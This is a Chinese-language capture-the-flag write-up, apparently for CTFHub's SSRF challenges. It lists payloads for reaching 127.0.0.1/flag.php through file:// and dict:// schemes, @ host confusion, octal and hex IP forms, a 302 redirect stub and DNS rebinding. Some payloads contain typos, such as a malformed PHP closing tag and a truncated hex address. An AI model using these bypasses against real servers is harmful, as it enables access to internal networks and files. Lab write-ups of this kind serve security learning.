##  内网访问：

payload

```
直接内网访问127.0.0.1/flag.php
```

##  伪协议读取文件

可以去读读[我的文章](https://editor.csdn.net/md/?articleId=120855618)

直接file://协议读取本地文章

payload:

```php
file:///var/www/html/flag.php
注意：有些时候flag.php不在该路径
```

##  端口扫描

题目提示端口在8000-9000，因此直接扫就可以了。这里我们需要使用dict伪协议来扫描，因为dict协议可以用来探测开放的端口。

直接url=dict://127.0.0.1:80,然后对端口80进行暴力破解

发现端口，直接访问127.0.0.1：端口数

##  POST请求



##  URLbybasss

payload:

```php
url=http://notfound.ctfhub.com@127.0.0.1/flag.php
```

如何绕过指定url的限制？

[极客大挑战-ssrf地址绕过](https://zhishihezi.net/endpoint/dialogue/new/0b4ed326fc8bffe3a0f11975c477dd76?event=436b34f44b9f95fd3aa8667f1ad451b196eb32db58ae5fbae62ec71e1b978b4bea84f027cddf5cb2a4fad7734ef155c8a96e5301c31e3a330644cb50bec6aed5473c036ea1ca9c7dde600b4dda98cb54a7976092fda20b66db16fec847a93eb3f3d4ef99d69e4583910412cb241a39381e5453679b9f40a2b886b1c36b1a715bd6ddd7809e4825fcf2773247927f348c7d4ec714dcedd32a84eb7f7ea6e40bcd68df41b272e8803bf3f16c770574d2c1d361fa64a4dc5decdecfd03a616fa675f5570e27178463019332381e06d21ce28f2d768ece54688d456be33dafe307c04378d2631b798bfdbbdaea0374adb20f5b8d0615b9ad4d5537b89472862f2e8c)

在URL中，因为parse_url和curl对host的解析不同，导致了可以通过@来绕过。

##  数字IP地址绕过

```
hacker! Ban '/127|172|@|\./'
```

过滤了127.点号，所以一些特殊的表示模式没法用

payload

```
url=http://0/flag.php
url=http://017700000001/flag.php,八进制，前面要加个0号
url=http://0x7F00000/falg.php,16进制，前面加个0x
但是二进制不行
```

##  302跳转

```
hacker! Ban Intranet IP
```

说明不能用127.0.0.1的ip，我们用我们自己的服务器（需要自己有个云服务器）

在服务器写个

```php
<?php
	header("Location:127.0.0.1/flag.php");
>?
```

然后访问url=http://xxx.x.x.x/flag.php

##  DNS重绑定

我们这儿可以利用A记录

payload1:

```php
url=http://sudo.cc/flag.php
A记录sudo.cc指向IP地址127.0.0.1。A记录就是域名指向ip地址，然后可以通过A记录转向访问
IP地址
```

payload2:

```php
url=http://r.xxx.ceye.io/flag.php,前面要加个r.
```

##  参考文章：

```php
fengq师傅:https://ego00.blog.csdn.net/article/details/108589988
```



